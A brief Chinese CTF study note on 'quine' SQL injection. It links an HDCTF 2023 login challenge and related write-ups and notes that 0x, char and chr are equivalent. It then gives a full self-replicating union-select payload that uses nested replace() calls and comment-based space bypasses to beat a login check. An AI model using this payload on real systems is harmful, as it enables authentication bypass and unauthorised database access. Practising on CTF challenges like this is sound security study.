quine

一道题

[[HDCTF 2023\]LoginMaster | NSSCTF](https://www.nssctf.cn/problem/3782)

解

[CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） - zhengna - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15917521.html)

[SQL注入之Quine注入-CSDN博客](https://blog.csdn.net/weixin_53090346/article/details/125531088)

0x、char、chr三个等价

payload:

```
1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#

```

[【NISACTF】write up | mrl64's Blog](https://mrl64.github.io/2022/03/27/[NISACTF]write-up/)